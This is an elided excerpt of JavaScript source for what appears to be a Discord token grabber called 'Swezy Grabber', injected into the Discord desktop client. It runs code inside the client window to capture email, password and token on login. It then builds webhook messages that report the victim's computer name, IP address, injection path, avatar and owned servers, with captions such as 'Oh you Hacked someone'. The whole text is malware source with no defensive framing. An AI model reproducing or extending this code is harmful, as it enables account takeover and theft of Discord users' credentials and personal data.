        ...
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
                ...
                if (token == null || token == undefined || token == "") {
                    ...
                    if(b.avatar === null){
                        usericonurl = "https://support.discord.com/hc/user_images/5O_1di3yc-0yQiCpsQ576w.png"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://support.discord.com/hc/user_images/5O_1di3yc-0yQiCpsQ576w.png"
...
async function Login(email, password, token) {
    ...
    window.webContents.executeJavaScript(`
        ...
        window.webContents.executeJavaScript(`
            ...
            const params = {
                username: "Swezy Grabber",
                avatar_url: "https://cdn.discordapp.com/attachments/942842974499373076/1069991988381880412/Bild_2022-10-12_200709819-removebg-preview.png",
                content: "",
                embeds: [{
                    "title": "Swezy User Login",
                    description: "**Oh you Hacked someone**",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
        ...
        window.webContents.executeJavaScript(`
           ...
           const params = {
                ...
                embeds: [{
                        ...
                        description: "**Oh you have Hacked someone**",
                        "color": config['embed-color'],
                        "fields": [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
        ...
        const params = {
            ...
            embeds: [{
            ...
            },
                {
                    ...
                    "color": config['embed-color'],
                    "description": `\`\`\`diff\n${fs.readFileSync('guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
